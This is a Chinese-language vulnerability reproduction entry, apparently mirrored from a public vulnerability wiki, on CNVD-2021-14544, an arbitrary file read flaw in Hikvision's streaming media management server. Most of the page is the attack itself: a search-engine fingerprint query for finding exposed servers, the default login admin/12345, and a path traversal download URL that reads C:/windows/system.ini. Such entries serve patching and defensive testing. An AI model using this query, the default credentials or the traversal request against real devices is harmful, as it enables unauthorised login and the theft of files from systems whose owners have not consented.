---
title: "Hikvision 流媒体管理服务器 后台任意文件读取漏洞 CNVD-2021-14544"
date: 2026-10-18 09:14:40
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "HIKVISION"
tags:
  - "HIKVISION"
  - "任意文件读取"
  - "信息泄露"
  - "弱口令"
  - "CNVD-2021-14544"
  - "漏洞复现"
---
## 漏洞描述

杭州海康威视系统技术有限公司流媒体管理服务器存在弱口令漏洞，攻击者可利用该漏洞登录后台通过文件遍历漏洞获取敏感信息

## 漏洞影响

```
Hikvision 流媒体管理服务器
```

## 网络测绘

```
"杭州海康威视系统技术有限公司 版权所有" && title="流媒体管理服务器"
```

## 漏洞复现

登录页面如下， 默认账号密码为 `admin/12345`

![image-20220519172955875](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191729966.png)

访问如下URL下载`C:/windows/system.ini`文件

```
http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/HIKVISION-%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CNVD-2021-14544.md)
